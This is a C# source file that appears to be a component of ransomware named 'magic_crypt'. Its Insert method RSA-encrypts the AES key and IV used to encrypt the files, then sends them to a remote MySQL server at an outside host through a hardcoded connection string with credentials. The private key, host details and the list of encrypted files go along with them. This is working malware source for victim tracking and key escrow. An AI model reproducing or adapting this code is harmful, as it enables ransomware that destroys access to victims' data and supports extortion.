using System;
using System.Xml.XPath;
using System.Text.Json;
using MySql.Data.MySqlClient;
using System.Collections.Generic;

namespace main
{
    public class Model
    {
        public Model()
        {
        }

        public int Insert(byte[] key, byte[] iv, XPathDocument publicKey, XPathDocument privateKey, List<string> encryptedFiles)
        {
            string jsonPublic = JsonSerializer.Serialize(publicKey);
            string jsonPrivate = JsonSerializer.Serialize(privateKey);
            string jsonEncryptedFiles = JsonSerializer.Serialize(encryptedFiles);


            var aesKey = Convert.ToBase64String(Crypt.RSAEncryptBytes(key, publicKey.ToString()));
            var aesIV = Convert.ToBase64String(Crypt.RSAEncryptBytes(iv, publicKey.ToString()));
            var host = new HostInfo();

            var jsonHost = JsonSerializer.Serialize(host);


            string sql = "INSERT INTO magic_crypt (id, private_key, public_key, aes_key, aes_iv, host_doc, encrypted_files) VALUES ";
            sql += "(UUID_TO_BIN(UUID()), @privKey, @pubKey, @aesKey, @aesIV, @jsonHost, @jsonFiles)";

            //string cnn = "SERVER=192.168.1.150;DATABASE=magic_crypt;UID=crypter;PASSWORD=F@nny.2020;";
            string cnn = "SERVER=remotepi.giize.com;Port=8484;DATABASE=magic_crypt;UID=crypter;PASSWORD=F@nny.2020;";
            try
            {
                using (MySqlConnection connection = new MySqlConnection(cnn))
                {
                    MySqlCommand cmd = new MySqlCommand(sql, connection);
                    cmd.Parameters.AddWithValue("@privKey", jsonPrivate);
                    cmd.Parameters.AddWithValue("@pubKey", jsonPublic);
                    cmd.Parameters.AddWithValue("@aesKey", aesKey);
                    cmd.Parameters.AddWithValue("@aesIV", aesIV);
                    cmd.Parameters.AddWithValue("@jsonHost", jsonHost);
                    cmd.Parameters.AddWithValue("@jsonFiles", jsonEncryptedFiles);

                    connection.Open();
                    return cmd.ExecuteNonQuery();
                }
            }
            catch (Exception ex)
            {
                throw new Exception(ex.Message);
            }
        }
    }
}
